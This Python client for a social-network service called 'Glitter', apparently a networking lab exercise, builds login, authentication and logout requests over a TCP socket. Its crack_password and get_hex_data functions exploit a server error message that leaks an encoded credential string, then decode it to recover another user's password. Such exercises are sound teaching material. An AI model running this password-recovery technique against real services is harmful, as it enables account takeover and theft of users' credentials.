import json
import sys

# status codes for glitter requests
import time
from msvcrt import getch

from alive_progress import alive_bar

# request codes for Glitter
status_codes = {
    'login': "100",
    'authentication': "110",
    'registration': "150",
    'logout': "200",
    'search': "300",
    'load_user': "310",
    'update_user': "350",
    'glance_status': "400",
    'glance_request': "410",
    'glance_approve': "420",
    'glance_refuse': "430",
    'load_updates': "440",
    'load_feed': "500",
    'publish_glit': "550",
    'publish_comment': "650",
    'like': "710",
    'dislike': "720",
    'publish_wow': "750",
    'delete_wow': "760"
}

# fail codes for Glitter
fail_codes = {
    'login_fail': "108",
    'dislike_fail': "729",
    'glit_fail': "559",
    'comment_fail': "659",
    'wow_delete_fail': "769"
}

# delimiters
MAIN_DELIMITER = "{gli&&er}"
PRE_DELIMITER = "#"
POST_DELIMITER = "##"

try:
    from colorama import init, Fore
except:
    print("You have to install colorama. just run: pip install colorama")
    exit()
# initialize colorama
init()
# define colors
RED = Fore.RED
GREEN = Fore.GREEN
LGREEN = Fore.LIGHTGREEN_EX
BLUE = Fore.BLUE
RESET = Fore.RESET


def get_choice():
    """
    Gets a choice number from user
    :return: user choice
    """
    print("Enter your choice: ", end='')
    choice = getch().decode()
    print(choice)
    return choice


def get_num(string="Enter number:", max_num=sys.maxsize, min_num=0):
    """
    Gets number from user
    :param string: Input message
    :param max_num: max allowed number
    :param min_num: min allowed number
    :return: number from user
    """
    while True:
        try:
            num = int(input(string))
            if num <= min_num or num > max_num:
                print(f"{RED}[!] Incorrect number{RESET}")
                continue
            break
        except:
            print(f"{RED}[!] Number must be an integer{RESET}")
    return num


def get_screen_name():
    """
    Gets screen name from user
    :return:
    """
    screen_name = input("Enter screen name: ")
    while screen_name == "":
        print(f"{RED}[!] Screen name mustn't be empty{RESET}")
        screen_name = input("Enter screen name: ")
    return screen_name


def convert_to_json(data):
    return json.dumps(data, separators=(",", ":"))


def separator(data):
    """
    Separates data
    :param data: data from glitter
    :return: Tuple: separated data (j_data, status code, status message)
    """
    # split status info from main data
    parts = data.split(MAIN_DELIMITER)

    # delete tail
    j_data = parts[1].replace(POST_DELIMITER, '')
    if j_data != "\n":
        # convert from json
        try:
            j_data = json.loads(j_data)
        except:
            j_data = "error"

    # get separate parts
    info = parts[0].split(PRE_DELIMITER)
    return j_data, info[0], info[1]


def print_login_info(username, password):
    """
    prints login info
    :param username:
    :param password:
    :return: None
    """
    print(f"""{GREEN}
    Logging in as:
    Username - {username}
    Password - {password}
    {RESET}""")


def create_auth_payload(data):
    """
    Creates authentication payload
    :param data: authentication code
    :return: generated payload
    """
    return status_codes['authentication'] + PRE_DELIMITER + MAIN_DELIMITER + data + POST_DELIMITER


def send_auth_payload(sock, data):
    """
    Sends authentication payload and gets the andswer
    :param sock: TCP socket
    :param data: authentication code
    :return: answer from server
    """
    sock.send(create_auth_payload(data).encode())
    return sock.recv(2048).decode()


def create_login_payload(username, password):
    """
    Creates login payload
    :param username: Username
    :param password: Password
    :return: generated payload
    """
    # dictionary that will be converted to json
    data = {
        "user_name": username,
        "password": password,
        "enable_push_notifications": True
    }
    return status_codes['login'] + PRE_DELIMITER + MAIN_DELIMITER + convert_to_json(data) + POST_DELIMITER


def send_login_payload(sock, username, password):
    """
    Sends login payload
    :param sock: TCP socket
    :param username: Username
    :param password: Password
    :return: answer from server
    """
    sock.send(create_login_payload(username, password).encode())
    return sock.recv(2048).decode()


def print_login_status(info):
    """
    Prints login status
    :param info: Dict: info from server
    :return: None
    """
    print(f"""{LGREEN}
    Logged in as: {info[0]['screen_name']}
    ID: {info[0]['id']}
    Avatar: {info[0]['avatar']}
    Description: {info[0]['description']}
    Privacy: {info[0]['privacy']}
    Gender: {info[0]['gender']}
    Mail: {info[0]['mail']}
    Date: {info[0]['date']}
    {RESET}""")


def print_login_fail(info):
    """
    Prints login fail message
    :param info: Dict: info fram server
    :return: None
    """
    print(f"""{RED}
    {info[0]['header']}
    Info: {info[2]}
    Description: {info[0]['description']}
    Recommendation: {info[0]['userRecommendation']}
    {RESET}""")


def login(sock, credentials):
    """
    Performs login operations
    :param credentials:
    :param sock: tcp socket
    :return: None
    """
    # separate user credentials
    username = credentials[0]
    password = credentials[1]
    print_login_info(username, password)

    # send login request and get the answer
    data = separator(send_login_payload(sock, username, password))
    # check, if login was successful
    if data[1] == fail_codes['login_fail']:
        print_login_fail(data)
        return "error"
    else:
        # send auth payload and get the answer
        data = separator(send_auth_payload(sock, "2066"))
        print_login_status(data)
        # get user id
        USER_ID = str(data[0]['id'])

        return USER_ID


def get_hex_data(sock, username):
    """
    Gets hex data with encoded login and password
    :param sock: TCP socket
    :param username: Username
    :return: Hex data
    """
    data = separator(send_login_payload(sock, username, "sdfs"))
    # check if username exists
    if data[0]['description'] == "Username doesn't exist":
        print(data[0]['description'])
        return "error"
    else:
        return data[2].split('hash: ')[1]


def password_decoder(data):
    """
    Decodes password from hex data
    :param data: Hex data
    :return: decoded password
    """
    # decode data
    password = ""
    with alive_bar(len(data), bar="classic2", spinner="classic") as bar:
        for i in range(len(data)):
            if i % 2 != 0:
                password += data[i]
            time.sleep(0.3)
            bar(password)
    init()
    # simpler, but without progress bar
    # return ''.join(data[i] for i in range(len(data)) if i % 2 != 0)
    return password


def crack_password(sock, username):
    """
    Cracks password for given username
    :param sock:
    :param username:
    :return:
    """
    # get hex data with encoded username and password
    hex_data = get_hex_data(sock, username)
    print(hex_data)
    # check if we got and error
    if hex_data == "error":
        print(f"{RED}[!] Failed to crack password{RESET}")
    else:
        print(f"{GREEN}\n[+] Found password for username: {username}\n{RESET}")
        # convert hex to ascii
        data = bytes.fromhex(hex_data).decode('ascii')

        password = password_decoder(data)

        print(f"Password: {password}")


def logout(sock, user_id):
    """
    Performs logout
    :param sock: TCP socket
    :param user_id: user id
    :return: None
    """
    payload = status_codes['logout'] + PRE_DELIMITER + MAIN_DELIMITER + str(user_id) + POST_DELIMITER
    sock.send(payload.encode())
    data = sock.recv(2048).decode()
    print(f"{LGREEN}[+] {separator(data)[2]}{RESET}")
